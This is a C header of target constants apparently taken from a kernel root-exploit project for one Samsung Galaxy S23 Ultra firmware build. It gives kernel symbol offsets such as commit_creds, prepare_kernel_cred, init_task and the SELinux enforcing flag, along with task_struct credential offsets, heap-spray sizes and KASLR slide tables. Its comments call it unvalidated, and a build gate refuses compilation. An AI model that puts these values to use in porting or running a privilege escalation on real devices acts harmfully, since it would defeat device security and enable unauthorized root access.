#ifndef OFFSET_H
#define OFFSET_H

/*
 * dm3q-S9180ZHU8GZIF — Galaxy S23 Ultra (SM-S9180), Taiwan/BRI build.
 *
 * STATIC DERIVATION ONLY (2026-11-17). Values below were derived offline
 * from the raw kernel Image of S9180ZHU8GZIF (5.15.197-android13-8-34343818,
 * built 2026-09-28, SPL 2026-10-05) using vmlinux-to-elf + BTF + nm.
 * Nothing here has been validated on device. There is NO working exploit
 * for this build yet (CVE-2026-43499 is binary-patched; CVE-2026-98260 and
 * CVE-2026-43284 are present but unported). Do not publish artifacts built
 * from this profile and do not flash it.
 *
 * Symbol offsets = vaddr - KIMAGE_TEXT_BASE. Trace event id and all
 * structure offsets were recomputed from this Image's BTF, not copied from
 * FZF5/FZG1 (those are included only as provenance references below).
 *
 * UNSUPPORTED TARGET — DO NOT BUILD, DO NOT FLASH, DO NOT PUBLISH.
 * This profile is missing constants the payload requires (P0_FINGERPRINT_HEADER,
 * the oracle gate/probe slot layout, ASHMEM_MISC_FOPS_OFF,
 * SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF, and the refined task/bank/slab
 * structure layout derived only from the exact Image), has never been built
 * or run, and has no device evidence. It is retained only as a research
 * record. See README.md in this directory and docs/SM-S9180-S9180ZHU8GZIF.md.
 */

/* DM3Q_GZIF_UNSUPPORTED_TARGET: hard build gate. Any attempt to build the
 * payload variants of this target (the preload/app-preload recipes) stops
 * here unless the builder explicitly defines DM3Q_GZIF_UNSUPPORTED_TARGET_OK
 * after deriving and providing every missing constant from the exact
 * S9180ZHU8GZIF Image. (`su_daemon.c`, the generic root helper, carries no
 * target constants and is deliberately untouched.) There is no supported
 * build today; the gate exists so a green build can never be mistaken for a
 * working payload. */
#if !defined(DM3Q_GZIF_UNSUPPORTED_TARGET_OK)
#error "dm3q-S9180ZHU8GZIF is an unsupported research target and refuses to build (define DM3Q_GZIF_UNSUPPORTED_TARGET_OK to attempt a build anyway; you will still lack most constants). See src/targets/dm3q-S9180ZHU8GZIF/README.md and docs/SM-S9180-S9180ZHU8GZIF.md"
#endif

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "dm3q-S9180ZHU8GZIF-app"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "dm3q-S9180ZHU8GZIF-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
 "samsung/dm3qzhx/qssi:17/CP2A.260605.016/S9180ZHU8GZIF:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
/* FZG1 parity (BTF here reports mm_struct size=992/vlen=2, low fidelity —
 * re-derive from the msm-kernel source drop before using the mm-spray path). */
#define MM_STRUCT_SZ 0x400
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
/* Same UEFI-map-corroborated hypothesis as S918B; keep as assumption until
 * live root confirms. */
#define P0_KERNEL_PHYS_LOAD 0xa7e58000ULL

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* BTF: task_struct.cred @ bits 15552 = 0x798 ; real_cred @ bits 15488 = 0x790
 * (bits 17440 = 0x884 pi_lock ; bits 17792 = 0x8b0 pi_blocked_on — same kalama
 * 5.15 layout as FZF5/FZG1, re-verified here). sched_task_group @ bits 8192
 * = 0x400. */
#define TASK_STRUCT_CRED_OFF      0x798ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
#define TASK_STRUCT_PI_LOCK_OFF   0x884ULL
#define TASK_STRUCT_PI_BLOCKED_ON_OFF 0x8b0ULL
#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL

/* Symbol offsets (nm vmlinux.elf): */
#define INIT_TASK_OFF             0x02c05400ULL
#define PREPARE_KERNEL_CRED_OFF   0x0011e694ULL
#define COMMIT_CREDS_OFF          0x001203d0ULL
#define OVERRIDE_CREDS_OFF        0x0011f4a8ULL

#define ROOT_TASK_GROUP_OFF       0x02cb9ac0ULL
/* BTF selinux_state: 'enforcing' is the FIRST member (bits_offset=0), so
 * SELINUX_ENFORCING == selinux_state symbol itself; NOT the FZF5-style +4. */
#define SELINUX_STATE_OFF         0x02d8e600ULL
#define SELINUX_ENFORCING_OFF     0x02d8e600ULL
#define KMALLOC_CACHES_OFF        0x020673f0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x01e81f20ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x02a90808ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00104888ULL

#define ASHMEM_FOPS_OFF           0x020102f8ULL
/* ashmem_misc_fops not present as a local symbol in this build — TODO verify
 * from the source drop or from *ashmem_misc_fops patterns before any port. */
/* #define ASHMEM_MISC_FOPS_OFF    0xTODO */
#define ASHMEM_IOCTL_OFF          0x011513a0ULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x011519fcULL
#define ASHMEM_MMAP_OFF           0x01151a54ULL
#define ASHMEM_OPEN_OFF           0x01151d34ULL
#define ASHMEM_RELEASE_OFF        0x01151dccULL
#define ASHMEM_SHOW_FDINFO_OFF    0x01151ee8ULL

#define CONFIGFS_READ_ITER_OFF    0x005d8a1cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005d9444ULL
#define COPY_SPLICE_READ_OFF      0x00528e28ULL
#define NOOP_LLSEEK_OFF           0x004bc6b4ULL

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#define SLIDE_USE_FAKE_TASK 1
#define COMPACT_RT_MUTEX_WAITER 1
/* Recomputed from this Image: 1160 entries in __ftrace_events,
 * event_sched_blocked_reason at index 88, __TRACE_LAST_TYPE = 20. */
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_MIN_VOTES 2
#define APP_TRACEFS_SLIDE 1
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 10
/* worker_thread @ 0xffffffc00810dd84; blocking `schedule` bl at
 * 0xffffffc00810ddf8; instruction after = 0xffffffc00810ddfc. */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010ddfcULL
/* TODO: SLIDE_TRACEFS_VFORK_CALLER_OFF — not derived. Re-derive from
 * kernel_clone (0xffffffc0080c7b08) once a port needs the vfork path. */
#define SLIDE_PSELECT_WORD_SHIFT 4

/* S918B/FZG1 parity set (P0 slide grid; byte values are Image-slide deltas).
 * p0_fingerprint.h in this directory was generated from THIS Image
 * (probe 0x1f8000, stride 0x8000, 64 rows, verified 512 qwords). */
#define SLIDE_P0_OFFSET_CANDIDATES \
 0x000000ULL, 0x008000ULL, 0x010000ULL, 0x018000ULL, \
 0x020000ULL, 0x028000ULL, 0x030000ULL, 0x038000ULL, \
 0x040000ULL, 0x048000ULL, 0x050000ULL, 0x058000ULL, \
 0x060000ULL, 0x068000ULL, 0x070000ULL, 0x078000ULL, \
 0x080000ULL, 0x088000ULL, 0x090000ULL, 0x098000ULL, \
 0x0a0000ULL, 0x0a8000ULL, 0x0b0000ULL, 0x0b8000ULL, \
 0x0c0000ULL, 0x0c8000ULL, 0x0d0000ULL, 0x0d8000ULL, \
 0x0e0000ULL, 0x0e8000ULL, 0x0f0000ULL, 0x0f8000ULL, \
 0x100000ULL, 0x108000ULL, 0x110000ULL, 0x118000ULL, \
 0x120000ULL, 0x128000ULL, 0x130000ULL, 0x138000ULL, \
 0x140000ULL, 0x148000ULL, 0x150000ULL, 0x158000ULL, \
 0x160000ULL, 0x168000ULL, 0x170000ULL, 0x178000ULL, \
 0x180000ULL, 0x188000ULL, 0x190000ULL, 0x198000ULL, \
 0x1a0000ULL, 0x1a8000ULL, 0x1b0000ULL, 0x1b8000ULL, \
 0x1c0000ULL, 0x1c8000ULL, 0x1d0000ULL, 0x1d8000ULL, \
 0x1e0000ULL, 0x1e8000ULL, 0x1f0000ULL, 0x1f8000ULL
#define SLIDE_MAX_ATTEMPTS 64
/* Forced-offset (SLIDE_P0_OFFSET) grid for this target: same 0x8000 stride as
 * SLIDE_P0_OFFSET_CANDIDATES, top candidate 0x1f8000. Without these, the
 * shared forced-offset check falls back to the classic 0x10000-grid rule and
 * rejects 32 of this table's 64 candidates (see docs/SM-S9180-S9180ZHU8GZIF.md). */
#define SLIDE_P0_FORCE_ALIGN 0x8000ULL
#define SLIDE_P0_FORCE_MAX   0x1f8000ULL

/* Image offset of the kCFI-visible "nfnetlink_log" string and of the
 * nfulnl_logger object (vmlinux symbol; file offset = vaddr - base). */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01d609e9ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02a91e50ULL
/* random_table (boot_id data ptr walk) — symbol exists at
 * 0xffffffc00abbaac0 (offset 0x02bbaac0); the +0 delta of the boot_id
 * data pointer itself was NOT re-derived — do not guess; re-derive against
 * the source drop or from the runtime leak chain before using. */
/* #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02bbaac0ULL (symbol only) */
#define SLIDE_SYSCTL_BOOTID_OFF 0x02e6c131ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL

#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)

/* Provenance references (do NOT copy values): dm3q-S9180ZHS8FZF5 (FZF5),
 * dm3q-S9180ZHS8FZG1 (FZG1). Root cause status for this build:
 * CVE-2026-43499 PATCHED (binary); CVE-2026-98260 OPEN (binary);
 * CVE-2026-43284 OPEN (binary). See docs/SM-S9180-S9180ZHU8GZIF.md. */

#endif /* OFFSET_H */
